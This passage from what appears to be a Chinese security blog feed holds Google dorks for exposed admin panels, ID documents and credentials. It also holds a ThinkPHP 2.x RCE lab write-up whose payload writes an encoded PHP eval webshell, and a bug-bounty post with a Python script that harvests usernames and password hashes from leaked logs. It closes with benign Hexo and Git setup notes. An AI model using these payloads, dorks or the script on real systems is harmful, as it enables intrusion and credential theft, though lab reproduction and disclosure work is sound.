class="hljs-symbol">inurl:</span>phpMyAdmin<br><span class="hljs-symbol">inurl:</span>ewebeditor<br><span class="hljs-symbol">intitle:</span>后台管理<br><span class="hljs-symbol">intitle:</span>后台管理 inurl:admin<br><span class="hljs-symbol">inurl:</span>http:<span class="hljs-comment">//baidu.com</span><br><span class="hljs-symbol">inurl:</span>php?<span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-symbol">inurl:</span>login<br><span class="hljs-symbol">site:</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;学生证&quot;</span> <span class="hljs-string">&quot;1992&quot;</span> <span class="hljs-string">&quot;1993&quot;</span> <span class="hljs-string">&quot;1994&quot;</span> <span class="hljs-string">&quot;1995&quot;</span> <span class="hljs-string">&quot;1996&quot;</span> <span class="hljs-string">&quot;1997&quot;</span> <span class="hljs-string">&quot;1998&quot;</span> <span class="hljs-string">&quot;1999&quot;</span> <span class="hljs-string">&quot;2000&quot;</span><br><span class="hljs-symbol">site:</span>.cn filetype:xls <span class="hljs-string">&quot;服务器&quot;</span> <span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-string">&quot;账号&quot;</span><br><span class="hljs-symbol">site:</span>file.*.net（.com/.cn）<br><span class="hljs-symbol">inurl:</span>ali <span class="hljs-string">&quot;管理平台&quot;</span><br>cache<br><br>类似于百度快照功能，通过cache或许可以查看到目标站点删除的敏感文件<br>也可以用来解决找目标站点的物理路径不报错，而无法找到物理路径。<br><span class="hljs-symbol">cache:</span>[http:<span class="hljs-comment">//xxx.com](https://link.zhihu.com/?target=http%3A//xxx.com)</span><br><br>“” + - | AND<br>将要搜索的关键字用引号括起来，搜索引擎将会搜索完全匹配关键字的网页<br>“房产” +南京 <span class="hljs-comment">//搜索与南京有关的房产</span><br>“房产” -南京 <span class="hljs-comment">//搜索结果除去南京的房产</span><br>房产|酒店 <span class="hljs-comment">//搜索房产或者酒店有关的页面</span><br>房产 AND 酒店 <span class="hljs-comment">//搜索同时匹配房产与酒店这两个关键词的页面</span><br></code></pre></td></tr></table></figure><p>对限定目标类型的语法：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>gitlab 公司 filetype:txt<br><span class="hljs-symbol">inurl:</span>gitlab 公司 intext:账号<br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com intext:账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com filetype:txt 账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>gitlab.*.com intext:密码<br><span class="hljs-symbol">site:</span>http:<span class="hljs-comment">//code.aliyun.com 2019 服务器地址</span><br></code></pre></td></tr></table></figure><p>对限定域名的语法：</p><p>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a><br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> filetype: txt (doc docx xls xlsx txt pdf等)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:管理<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> inurl:login<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intitle:管理<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> filetype:asp(jsp php aspx等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> intext:ftp:&#x2F;&#x2F;<em>:</em>(地址 服务器 虚拟机 password等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> inurl:file(load)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:*@<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> &#x2F;&#x2F;得到N个邮件地址，还有邮箱的主人的名字什么的<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:电话 &#x2F;&#x2F;N个电话</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp2.x_RCE靶场复现</title>
    <link href="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>vulfocus靶场复现</p><span id="more"></span><h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 &#123; Fast &amp; Simple OOP PHP Framework &#125;</code></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p><p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure><p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p><p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p><p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;$var[&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;]=&quot;2&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/$&#123;@print(THINK_VERSION)&#125;<br></code></pre></td></tr></table></figure><p>写入木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure><h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png"></p><p>测试是否存在，拼接路由<code>/index.php/module/action/param1/$&#123;@phpinfo()&#125;</code></p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png"></p><p>使用漏洞利用工具扫描，得到相同的结果</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-29-56.png"></p><p>存在<code>tp2_lite_code_exec</code>漏洞，传马Getshell</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-33-42.png"></p><p>使用蚁剑连接，</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-37-47.png"></p><p>找到flag，通关</p><p><img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-40-05.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Thinkphp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次公益src挖掘-230804</title>
    <link href="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/"/>
    <url>/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/</url>
    
    <content type="html"><![CDATA[<p>终于有一个TP的洞啦！😘</p><span id="more"></span><h3 id="鹰图找目标"><a href="#鹰图找目标" class="headerlink" title="鹰图找目标"></a>鹰图找目标</h3><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p>搜索语法，找到PHP的站点</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">icp.name<span class="hljs-operator">=</span><span class="hljs-string">&quot;xxx市&quot;</span> and app.vendor<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHP&quot;</span><br></code></pre></td></tr></table></figure><h3 id="发现存在Thinkphp框架"><a href="#发现存在Thinkphp框架" class="headerlink" title="发现存在Thinkphp框架"></a>发现存在Thinkphp框架</h3><p>访问网站，出现登陆页</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-08-06.png"></p><p>发现采用ThinkPHP框架</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-09-15.png"></p><p>使用工具扫描直接出ThinkPHP3.2.3日志泄露</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-12-07.png"></p><p>访问url：<a href="http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log">http://xxx.xxx.com/App/Runtime/Logs/Home/23_08_04.log</a></p><p>确认存在日志信息泄露，且发现存在用户名和密码的hash值泄露</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-14-53.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `yz_users` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> `password` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;591d1260284e15731d151787dd6ad356&#x27;</span> LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="写Python脚本遍历收集"><a href="#写Python脚本遍历收集" class="headerlink" title="写Python脚本遍历收集"></a>写Python脚本遍历收集</h3><p>选择写一个Python脚本收集所有用户名和密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>,<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>            url=<span class="hljs-string">f&#x27;http://xxx.xxx.com/App/Runtime/Logs/Home/<span class="hljs-subst">&#123;i&#125;</span>_0<span class="hljs-subst">&#123;j&#125;</span>_0<span class="hljs-subst">&#123;k&#125;</span>.log&#x27;</span><br>            response = requests.get(url)<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                data = response.text<br>                pattern = <span class="hljs-string">r&quot;`username`\s*=\s*([^`]+)\s+AND\s+`password`\s*=\s*([^`]+)&quot;</span><br>                username_match = re.search(pattern, data)<br>                <span class="hljs-keyword">if</span> username_match:<br>                    <span class="hljs-comment"># 提取到了username和password</span><br>                    username = username_match.group(<span class="hljs-number">1</span>)<br>                    password = username_match.group(<span class="hljs-number">2</span>)<br>                    password = password[<span class="hljs-number">0</span>:<span class="hljs-number">34</span>]<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Match:<span class="hljs-subst">&#123;username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-10_23-16-59.png"></p><p>点到为止就可以提交到平台啦！</p><p>居然只给了一个中危，可能有MD5吧哈哈🤣🤣</p><p><img src="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/Snipaste_2023-08-31_23-06-49.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
      <tag>Thinkphp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo个人博客写文章以及Git报错解决</title>
    <link href="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>博客博客博客~~</p><span id="more"></span><h3 id="用Hexo写博客"><a href="#用Hexo写博客" class="headerlink" title="用Hexo写博客"></a>用Hexo写博客</h3><p>使用终端在命令行里创建一篇博客，然后会在目录<code>/source/_posts</code>下生成一个Markdown文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new post blog_name<br></code></pre></td></tr></table></figure><p><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-50-25.png"></p><p><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-54-25.png"></p><p>现在开始编辑</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>生成“分类”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">分类</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">categories</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加categories标签</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客写文章以及Git报错解决</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">Github个人博客搭建和使用</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>生成“标签”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标签</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-10 10:11:27</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">tags</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加tags标签</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: 个人博客写文章以及Git报错解决<br>date: 2023<span class="hljs-string">-08</span><span class="hljs-string">-10</span> 09:46:40<br>categories: Github个人博客搭建和使用<br><span class="hljs-keyword">tags:</span> [Github,博客搭建]<br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h3 id="git提交文章报错"><a href="#git提交文章报错" class="headerlink" title="git提交文章报错"></a>git提交文章报错</h3><h4 id="OpenSSL-SSL-read-Connection-was-reset-errno-10054"><a href="#OpenSSL-SSL-read-Connection-was-reset-errno-10054" class="headerlink" title="OpenSSL SSL_read: Connection was reset, errno 10054"></a>OpenSSL SSL_read: Connection was reset, errno 10054</h4><p>在文件里<code>git bash here</code>，设置后关闭当前terminal窗口，重新打开再执行git操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify &quot;false&quot; <br></code></pre></td></tr></table></figure><h4 id="Failed-to-connect-to-github-com-port-443-Operation-timed-out"><a href="#Failed-to-connect-to-github-com-port-443-Operation-timed-out" class="headerlink" title="Failed to connect to github.com port 443:Operation timed out"></a>Failed to connect to github.com port 443:Operation timed out</h4><p>​首先，你有全局的科学上网小猫猫，然后在git里执行更换代理即可，注意使用V2ray的默认端口是1080。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:7890 <br>git config --global https.proxy http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Github上搭建自己的个人博客</title>
    <link href="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>搭博客~~</p><span id="more"></span><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="Github账号"><a href="#Github账号" class="headerlink" title="Github账号"></a>Github账号</h4><p>需要有一个<code>GitHub</code>账号，没有的话到 <a href="https://github.com/">官网 </a>申请一个。</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4><p>在自己电脑上安装好<code>Git</code>，<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>部署到<code>GitHub</code>时要用</p><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h4><p>官网下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="test1"></p><p>打开cmd窗口，执行命令 <code>node -v</code> 查看node版本</p><p>在安装node的同时也安装了npm，执行 <code>npm -v</code> 查看npm版本</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808150618974.png" alt="image-20230808150618974"></p><h4 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h4><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151116734.png" alt="image-20230808151116734"></p><p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151259633.png" alt="image-20230808151259633"></p><p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151342603.png" alt="image-20230808151342603"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808151445824.png" alt="image-20230808151445824"></p><p>首先确定分支，然后重新打开设置GitHub Pages中找到我们主页的地址为 <a href="https://remixxyh.github.io/3xsh0re.github.io/">https://remixxyh.github.io/3xsh0re.github.io/</a></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808152113275.png" alt="image-20230808152113275"></p><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>我们采用<code>Hexo</code>来创建我们的博客网站，<code>Hexo</code> 是一个基于<code>NodeJS</code>的静态博客网站生成器，使用<code>Hexo</code>不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 <a href="https://hexo.io/zh-cn/">官网</a>。</p><p>安装 <code>Hexo</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g hexo-cli<br></code></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo -v<br></code></pre></td></tr></table></figure><p>解决报错</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">hexo : 无法加载文件 <span class="hljs-name">C</span>:\Users\DELL\AppData\Roaming\npm\hexo.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 <span class="hljs-name">https</span>:<br>/go.microsoft.com/fwlink/?LinkID=<span class="hljs-number">135170</span> 中的 about_Execution_Policies。<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>打开开发者选项</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155045188.png" alt="image-20230808155045188"></p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155116199.png" alt="image-20230808155116199"></p><p>成功解决</p><p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808155133450.png" alt="image-20230808155133450"></p><p>创建一个项目 <code>hexo-blog</code> 并初始化，踩雷，不能在盘根目录下创建，要建立二级目录才行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo init hexo-blog<br>cd hexo-blog<br>npm install<br>hexo g<br>hexo server<br></code></pre></td></tr></table></figure><p><img 